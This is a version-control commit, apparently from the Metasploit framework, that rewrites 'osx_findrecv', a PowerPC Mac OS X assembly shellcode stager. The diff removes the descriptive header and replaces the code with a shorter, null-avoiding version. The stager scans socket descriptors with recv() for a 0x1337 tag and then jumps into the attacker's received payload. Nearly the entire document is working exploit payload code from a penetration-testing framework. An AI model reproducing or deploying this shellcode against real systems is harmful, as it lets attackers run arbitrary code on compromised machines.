ba7b7b79e2a4ea849033a3e55d9c866031e2b0d2
HD Moore <hd_moore@rapid7.com>
2004-12-10 09:24:31 +0000

    New, working, shiny, spiffy, 78 byte findrecv code

--- src/shellcode/osx/osx_findrecv.s
+++ src/shellcode/osx/osx_findrecv.s
@@ -1,51 +1,28 @@
-;;
-;
-;        Name: osx_findrecv
-;   Qualities: Can Have Nulls
-;   Platforms: MacOS X / PPC
-;     Authors: H D Moore <hdm [at] metasploit.com>
-;     Version: $Revision$
-;     License:
-;
-;        This file is part of the Metasploit Exploit Framework
-;        and is subject to the same licenses and copyrights as
-;        the rest of this package.
-;
-; Description:
-;
-;        This payload will recv() downward until the read
-;        data contains the search tag (0xXXXX1337). Once the
-;        tag is located, it will jump into the payload.
-;
-;;
-
-
-
 .globl _main
 .text
 _main:
-	li 	r29, 4096
-	mtctr 	r29
+	li 	r29, 0xfff
+	li	r30, 0xfff
+	addic.	r28, r29, -0xfff +1
 
 findsock:
-	li	r0, 102
-	mfctr	r3
-	subi	r4, r1, 8192
-	li 	r5, 8192
-	li	r6, 2
-	sc
-	b	next
+	subf.   r30, r28, r30
+	blt	_main
+
+	subi	r0, r29, 0xfff - 102
+	mr	r3, r30
+	subi	r4, r1, 4104
+	li 	r5, 4095
+	subi    r6, r29, 0xfff - 0x80
+	.long   0x44ffff02
+	xor.	r6, r6, r6
 	
-	lwz	r28, -8192(r1)
-	cmpwi	r28, 0x1337
-	btl	eq, gotsock
-	xor	r5, r5, r5
-next:
-	bdnz-	findsock
+	lhz	r27, -4104(r1)
+	cmpwi	r27, 0x1337
+	bne	findsock
 
 gotsock:
-	addi	r28, r1, -8188
-	mfctr	r30
-	mtlr	r28
-	blr
-	xor	r5, r5 ,r5
+	subi	r4, r1, 4100
+	mtctr	r4
+	blectr	
+	xor.	r6, r6, r6
